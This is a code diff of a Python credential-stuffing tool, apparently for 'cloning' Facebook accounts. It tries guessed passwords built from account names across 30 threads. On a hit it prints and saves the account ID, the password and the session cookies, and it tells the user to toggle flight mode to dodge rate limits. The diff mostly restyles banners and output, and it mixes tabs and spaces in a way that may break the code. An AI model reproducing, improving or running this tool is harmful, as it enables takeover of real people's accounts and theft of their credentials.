@@ -414,12 +414,15 @@ def setting():
 	exit()
  
 def passwrd():
-	os.system('clear')
-	banner()
-	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	SHANTOj(f'\033[0;97m===============================================')
+    os.system('clear')
+    print(logo)
+    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
+    print('\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -465,16 +468,19 @@ def passwrd():
 					pwv.append(frs+'111')
 					
 				pool.submit(crack,idf,pwv)
-	print('')
-	SHANTOj('==========================================')
-	SHANTOj('CLONING COMPLETE .......... ')
-	print(f'{h}[{h}ðŸŒº{h}]{h} Your Total OK idz : {h}%s '%(ok))
-	input('CLICK ENTER TO EXIT ')
+	print('\n\033[1;37m===================================')
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
+    print('\n\033[1;37m===================================')
+    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
+    os.system("python nono.py")
+    exit()
 		
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[SHANTO🖤] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}🖤[{h}Ok{P}🖤{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[SHANTO🤍] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}🤍[{h}Ok{P}🤍{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -503,7 +509,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-OK🖤] {idf}  {pw}\n\033[0;93m[🖤]= COOKIES 🖤 \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO-OK🤍] {idf}  {pw}\n\033[0;93m[🤍]= COOKIES 🤍 \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
